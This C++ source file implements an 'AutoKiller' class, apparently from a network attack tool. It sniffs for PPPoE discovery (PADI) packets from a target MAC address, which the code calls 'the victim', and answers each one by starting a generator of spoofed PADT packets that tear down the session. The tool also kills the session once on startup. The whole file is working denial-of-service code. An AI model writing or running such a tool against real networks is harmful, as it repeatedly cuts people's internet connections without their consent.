#include "AutoKiller.h"
#include "GPacketDetector.h"
#include "PADTGenerator.h"
#include <boost/bind.hpp>
#include <boost/format.hpp>
#include <boost/thread/mutex.hpp>

using namespace std;
using namespace glib;
using namespace log4cxx;

AutoKiller::AutoKiller(const boost::array<unsigned char, 6> & src, const boost::array<unsigned char, 6> & dst,
		const std::string & name, const unsigned int interval)
		: Killer(KILLER_ID, src, dst, name, interval)
{
	m_padt_gnr.reset(new PADTGenerator(name, dst.data(), src.data(), interval));
	m_logger = Logger::getLogger("autokiller");
}

void AutoKiller::padi_detected(const unsigned char* packet, int len)
{
	boost::array<unsigned char, 6> srcmac = getSrcMAC();
	if(memcmp(packet+6, srcmac.data(), 6))
	{
		LOG4CXX_INFO(m_logger,
			boost::format("PADI detected but ignored: %02X:%02X:%02X:%02X:%02X:%02X") %
				*(packet+6) % *(packet+7) % *(packet+8) %
				*(packet+9) % *(packet+10) % *(packet+11));
		return;
	}

	LOG4CXX_INFO(m_logger, "PADI detected");

	msig_detected((const unsigned char*)srcmac.data());

	boost::mutex::scoped_lock lock(m_padi_mutex);
	boost::array<unsigned char, 6> dstmac = getDstMAC();

	if(m_padt_gnr->isAlive())
		m_padt_gnr->waitStop();

	// wait for the victim to complete the initialization
	GThread::sleep(1000);
	m_padt_gnr->start();
}

void AutoKiller::killthread()
{
	char buf[32];
	boost::array<unsigned char, 6> mac;
	mac = getSrcMAC();
	sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X",
		mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
	log4cxx::MDC::put("srcmac", std::string(buf));
	mac = getDstMAC();
	sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X",
		mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
	log4cxx::MDC::put("dstmac", std::string(buf));
	
	LOG4CXX_DEBUG(m_logger, "thread started");
	boost::scoped_ptr<GPacketDetector> padi_dtr(
						new GPacketDetector("ether[0]=255 and ether proto 0x8863",
						getCardName()));
	padi_dtr->AddReactor(boost::bind(&AutoKiller::padi_detected, this, _1, _2));
	padi_dtr->start();

	// Kill the first time
	if(m_padt_gnr->isAlive() == false)
		m_padt_gnr->start();

	while(!IsStopping())
		GThread::sleep(100);

	padi_dtr->waitStop();
	m_padt_gnr->waitStop();

	LOG4CXX_DEBUG(m_logger, "thread terminated");
}

